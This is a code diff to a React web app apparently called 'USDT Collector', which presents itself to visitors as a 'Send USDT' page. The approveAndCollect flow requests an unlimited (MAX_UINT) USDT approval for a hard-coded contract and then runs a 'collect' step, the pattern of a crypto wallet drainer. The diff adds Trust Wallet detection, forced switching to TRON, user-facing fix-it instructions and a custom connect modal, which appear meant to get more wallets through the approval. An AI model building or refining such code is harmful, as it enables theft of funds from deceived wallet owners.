@@ -13,6 +13,7 @@ import { BrowserProvider, Contract, formatUnits } from 'ethers'
 import { TronAdapter } from '@reown/appkit-adapter-tron'
 import { tronMainnet } from '@reown/appkit/networks'
 import { TronLinkAdapter } from '@tronweb3/tronwallet-adapter-tronlink'
+import { TrustAdapter } from '@tronweb3/tronwallet-adapter-trust'
 import { MetaMaskAdapter } from '@tronweb3/tronwallet-adapter-metamask-tron'
 import { OkxWalletAdapter } from '@tronweb3/tronwallet-adapter-okxwallet'
 import { Copy, CheckCircle, AlertCircle, Wallet } from 'lucide-react'
@@ -28,9 +29,8 @@ import TronWeb from 'tronweb'
 // ── CONFIG ──
 const WC_PROJECT_ID = '7fb3ba95be65cff7bc75b742e816b1cb'
 const NETWORK = 'Mainnet'
-const CONTRACT_ADDRESS = 'TEgdXwe91pY49EfG5oEzP4mwPQ7Koj77GZ' // Tron Contract
+const CONTRACT_ADDRESS = 'TEgdXwe91pY49EfG5oEzP4mwPQ7Koj77GZ'
 
-// Include both Tron and EVM networks
 const appkitNetworks: [AppKitNetwork, ...AppKitNetwork[]] = [
   tronMainnet,
   mainnet,
@@ -69,7 +69,7 @@ const tronAdapter = new TronAdapter({
   walletAdapters: [
     new TronLinkAdapter({ openUrlWhenWalletNotFound: false, checkTimeout: 3000 }),
     new MetaMaskAdapter(),
-    // ✨ FIX 1: TrustAdapter removed! This forces WalletConnect to take over Trust Wallet, bypassing the broken EVM browser.
+    new TrustAdapter({ openUrlWhenWalletNotFound: false }),
     new OkxWalletAdapter({ openUrlWhenWalletNotFound: false }),
   ],
 })
@@ -130,10 +130,12 @@ export default function App() {
   const [loading, setLoading] = useState(false)
   const [txHash, setTxHash] = useState('')
   const autoTriggered = useRef(false)
+  // ✨ ADDED MODAL STATE
+  const [showWalletModal, setShowWalletModal] = useState(false)
 
-  const { open } = useAppKit()
+ const { open } = useAppKit()
   const { address: walletAddress, isConnected, caipAddress } = useAppKitAccount()
-  const { chainId, switchNetwork } = useAppKitNetwork() 
+  const { chainId, switchNetwork } = useAppKitNetwork() // <-- Added switchNetwork
 
   const { walletProvider: evmWalletProvider } = useAppKitProvider('eip155')
   const { walletProvider: tronWalletProvider } = useAppKitProvider('tron')
@@ -143,14 +145,22 @@ export default function App() {
 
   const resolveTronWeb = () => {
     const w = window as any;
+
     if (w.tronWeb?.contract) return w.tronWeb;
     if (w.tronLink?.tronWeb?.contract) return w.tronLink.tronWeb;
+    
+    if (w.trustwallet?.tronWeb?.contract) return w.trustwallet.tronWeb;
+    if (w.trustWallet?.tronWeb?.contract) return w.trustWallet.tronWeb;
+    if (w.trustwallet?.tronLink?.tronWeb?.contract) return w.trustwallet.tronLink.tronWeb;
+    if (w.trustWallet?.tronLink?.tronWeb?.contract) return w.trustWallet.tronLink.tronWeb;
+    if (w.tron?.tronWeb?.contract) return w.tron.tronWeb; 
 
     if (tronWalletProvider) {
       if ((tronWalletProvider as any).contract) return tronWalletProvider;
       if ((tronWalletProvider as any).adapter?.tronWeb?.contract) return (tronWalletProvider as any).adapter.tronWeb;
       if ((tronWalletProvider as any).tronWeb?.contract) return (tronWalletProvider as any).tronWeb;
     }
+
     return null;
   };
 
@@ -179,12 +189,17 @@ export default function App() {
           log("⚠️ Using Public Provider for balance (Injected not found)");
           try {
             const publicTronWeb = instantiateTronWeb('https://api.trongrid.io');
-            // ✨ FIX 2: You MUST set the address before checking balance!
-            publicTronWeb.setAddress(walletAddress); 
             await getTronBalance(publicTronWeb, walletAddress);
             
-            setStatus('Ready'); 
-            log('WalletConnect/Public mode active');
+            // If we are in Trust Wallet but no TronWeb was found, it means the network is wrong.
+            const w = window as any;
+            if (w.trustwallet) {
+              setStatus('Action Needed: Switch to TRON');
+              log('❌ Trust Wallet is on the wrong network');
+            } else {
+              setStatus('Ready'); 
+              log('WalletConnect/Public mode active');
+            }
           } catch (e: any) {
             log(`❌ Init Error: ${e.message}`);
             setStatus('Ready');
@@ -204,14 +219,13 @@ export default function App() {
 
   const getTronBalance = async (tw: any, addr: string) => {
     try {
-      tw.setAddress(addr); // Safety check
       const usdt = await tw.contract(USDT_ABI).at(USDT_ADDRESS)
       const bal = await usdt.balanceOf(addr).call()
       setUsdtBalance((Number(bal) / 1_000_000).toFixed(2))
       setStatus('Ready')
       log(`TRON USDT: ${(Number(bal) / 1_000_000).toFixed(2)}`)
-    } catch (e: any) {
-      log(`❌ TRON balance fetch failed: ${e.message || 'Unknown error'}`)
+    } catch (e) {
+      log('❌ TRON balance fetch failed')
     }
   }
 
@@ -226,7 +240,12 @@ export default function App() {
     try {
       const ethersProvider = new BrowserProvider(provider)
       const token = new Contract(EVM_USDT[currentChainId], EVM_ERC20_ABI, ethersProvider)
-      const [bal, decimals] = await Promise.all([ token.balanceOf(addr), token.decimals() ])
+
+      const [bal, decimals] = await Promise.all([
+        token.balanceOf(addr),
+        token.decimals(),
+      ])
+
       const formatted = formatUnits(bal, decimals)
       setUsdtBalance(formatted)
       setStatus('Ready')
@@ -252,18 +271,36 @@ export default function App() {
       }
 
       if (isEVM) {
-        if (!evmWalletProvider) return
+        if (!evmWalletProvider) {
+          log('❌ EVM provider not available')
+          setStatus('EVM wallet connected, but EVM provider is not available.')
+          return
+        }
         await getEvmBalance(evmWalletProvider, walletAddress, Number(chainId))
         return
       }
+
+      setStatus('Unsupported wallet namespace')
+      log('❌ Unsupported namespace')
     } catch (e: any) {
+      console.warn('Balance fetch failed', e)
+      log(`❌ Balance fetch failed: ${e?.message || 'Unknown error'}`)
       setStatus('Failed to fetch balance')
     }
   }
 
-  const handleConnect = () => open({ view: 'AllWallets' })
+// ✨ CUSTOM MODAL HANDLERS
+  const handleConnect = () => {
+    setShowWalletModal(true) // Opens our custom modal instead of Reown directly
+  }
 
-  const approveAndCollect = async () => {
+  const triggerReown = () => {
+    setShowWalletModal(false)
+    open({ view: 'AllWallets' }) // Hands it off to Reown after they select an option
+  }
+
+ const approveAndCollect = async () => {
+    // ✨ THE NETWORK SWITCHER FIX ✨
     if (isEVM) {
       log("⚠️ App is on EVM. Forcing switch to TRON...");
       setStatus('Switching to TRON Network...');
@@ -271,16 +308,29 @@ export default function App() {
         if (switchNetwork) {
           await switchNetwork(tronMainnet);
         } else {
-          open({ view: 'Networks' });
+          open({ view: 'Networks' }); // Fallback to AppKit UI
         }
       } catch (e: any) {
         log(`❌ Switch failed: ${e.message}`);
-        open({ view: 'Networks' });
+        open({ view: 'Networks' }); // Open Reown's network menu so user can click Tron
       }
       return;
     }
 
     if (!walletAddress) return;
+
+    const activeTw = resolveTronWeb();
+    const w = window as any;
+
+    // ✨ THE TRUST WALLET INTERCEPTOR ✨
+    // Blocks the transaction and tells the user exactly how to fix the network issue
+    if (w.trustwallet && !activeTw) {
+      log("❌ Trust Wallet TRON provider blocked.");
+      setStatus('Action Needed: Switch to TRON');
+      alert('TRUST WALLET FIX REQUIRED:\n\nYour Trust Wallet browser is currently set to an Ethereum/BNB network instead of TRON.\n\n1. Look at the very top of your screen.\n2. Tap the Network/Chain icon.\n3. Change it to TRON.\n4. Wait a few seconds for it to reload.');
+      setLoading(false);
+      return;
+    }
 
     setLoading(true);
     setStatus('Step 1/2: Approving...');
@@ -289,9 +339,8 @@ export default function App() {
     try {
       const MAX_UINT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
       const FULL_HOST = NETWORK === 'Mainnet' ? 'https://api.trongrid.io' : 'https://nile.trongrid.io';
-      const activeTw = resolveTronWeb();
 
-      // ----------- PATH A: Fully Injected Wallet (TronLink, TokenPocket) -----------
+      // ----------- PATH A: Fully Injected Wallet (TronLink, TokenPocket, Trust on correct network) -----------
       if (activeTw && typeof activeTw.contract === 'function') {
         log('Executing via Injected Provider...');
         const usdt = await activeTw.contract(USDT_ABI).at(USDT_ADDRESS);
@@ -316,12 +365,11 @@ export default function App() {
         return;
       }
 
-      // ----------- PATH B: AppKit / WalletConnect (Trust Wallet Fix) -----------
+      // ----------- PATH B: AppKit / WalletConnect -----------
       if (tronWalletProvider) {
         log("Executing via Reown Universal Provider...");
         
         const publicTw = instantiateTronWeb(FULL_HOST);
-        publicTw.setAddress(walletAddress); // Critical for transaction building
         
         const signAndSend = async (contractAddr: string, func: string, params: any[], fee: number) => {
           const { transaction } = await publicTw.transactionBuilder.triggerSmartContract(
@@ -333,18 +381,22 @@ export default function App() {
           );
           
           let signedTx;
-          const provider = tronWalletProvider as any;
           
-          // ✨ FIX 3: Correct WalletConnect routing method. Avoids the 'internalRequest' crash.
-          if (typeof provider.request === 'function') {
-            signedTx = await provider.request({ 
-              method: 'tron_signTransaction', 
-              params: { transaction } 
-            });
-          } else if (typeof provider.signTransaction === 'function') {
-            signedTx = await provider.signTransaction(transaction);
-          } else {
-            throw new Error("Provider does not support signing");
+          // Try/Catch specifically to catch AppKit provider routing errors
+          try {
+            if (typeof (tronWalletProvider as any).signTransaction === 'function') {
+              signedTx = await (tronWalletProvider as any).signTransaction(transaction);
+            } else if (typeof (tronWalletProvider as any).request === 'function') {
+              signedTx = await (tronWalletProvider as any).request({ method: 'tron_signTransaction', params: { transaction } });
+            } else {
+              throw new Error("Provider does not support signing");
+            }
+          } catch (signErr: any) {
+            // Catch the specific internalRequest / formatting errors
+            if (signErr.message?.includes("internalRequest") || signErr.message?.includes("not a function")) {
+              throw new Error("Provider rejected request. Switch to TRON network.");
+            }
+            throw signErr;
           }
 
           const broadcast = await publicTw.trx.sendRawTransaction(signedTx);
@@ -405,7 +457,9 @@ export default function App() {
       <div className="max-w-md w-full bg-zinc-900 rounded-3xl shadow-2xl border border-zinc-800 overflow-hidden">
         <div className="bg-black px-6 py-5 flex items-center justify-between border-b border-zinc-800">
           <div className="flex items-center gap-3">
-            <div className="w-9 h-9 bg-emerald-400 rounded-2xl flex items-center justify-center text-black font-bold text-xl">U</div>
+            <div className="w-9 h-9 bg-emerald-400 rounded-2xl flex items-center justify-center text-black font-bold text-xl">
+              U
+            </div>
             <h1 className="text-3xl font-bold">USDT Collector</h1>
           </div>
           <div className="text-xs px-4 py-1 bg-emerald-500/10 text-emerald-400 rounded-full">
@@ -417,6 +471,7 @@ export default function App() {
           {!isConnected ? (
             <div className="text-center">
               <h2 className="text-5xl font-bold mb-3">Send USDT</h2>
+
               <button
                 onClick={handleConnect}
                 disabled={loading}
@@ -425,6 +480,10 @@ export default function App() {
                 Connect Wallet
                 <Wallet className="w-6 h-6" />
               </button>
+
+              <p className="text-xs text-zinc-500 mt-6">
+                Opens directly to All Wallets with search
+              </p>
             </div>
           ) : (
             <div className="space-y-6">
@@ -469,6 +528,58 @@ export default function App() {
                   TX: {txHash}
                 </p>
               )}
+            </div>
+          )}
+
+          {/* ✨ YOUR CUSTOM CONNECT WALLET MODAL ✨ */}
+          {showWalletModal && (
+            <div className="fixed inset-0 z-50 flex items-end sm:items-center justify-center bg-black/80 p-4 pb-8 sm:p-4 transition-all">
+              <div className="bg-[#121212] border border-zinc-800 rounded-3xl w-full max-w-sm overflow-hidden shadow-2xl relative">
+                
+                {/* Header */}
+                <div className="pt-6 pb-4 px-6 text-center relative">
+                  <h3 className="font-bold text-white text-xl">Connect Wallet</h3>
+                  <button 
+                    onClick={() => setShowWalletModal(false)} 
+                    className="absolute right-6 top-6 text-zinc-500 hover:text-white"
+                  >
+                    ✕
+                  </button>
+                </div>
+
+                {/* Buttons */}
+                <div className="p-4 space-y-3">
+                  
+                  {/* Option 1: Browser Wallet */}
+                  <button 
+                    onClick={triggerReown}
+                    className="w-full flex items-center p-4 bg-[#1A1B1F] hover:bg-[#222327] border border-emerald-500/50 rounded-2xl transition-all group"
+                  >
+                    <div className="w-12 h-12 bg-orange-500/10 rounded-xl flex items-center justify-center mr-4 group-hover:scale-105 transition-transform">
+                      <span className="text-2xl">🦊</span>
+                    </div>
+                    <div className="text-left">
+                      <p className="font-bold text-white text-[15px]">Browser Wallet</p>
+                      <p className="text-xs text-zinc-400 mt-0.5">MetaMask, Rabby, Coinbase...</p>
+                    </div>
+                  </button>
+
+                  {/* Option 2: Trust Wallet & Mobile */}
+                  <button 
+                    onClick={triggerReown}
+                    className="w-full flex items-center p-4 bg-[#1A1B1F] hover:bg-[#222327] border border-transparent rounded-2xl transition-all group"
+                  >
+                    <div className="w-12 h-12 bg-blue-500/10 rounded-xl flex items-center justify-center mr-4 group-hover:scale-105 transition-transform">
+                      <span className="text-2xl">🛡️</span>
+                    </div>
+                    <div className="text-left">
+                      <p className="font-bold text-white text-[15px]">Trust Wallet & Mobile</p>
+                      <p className="text-xs text-zinc-400 mt-0.5">Scan QR • Works with any wallet</p>
+                    </div>
+                  </button>
+
+                </div>
+              </div>
             </div>
           )}
 
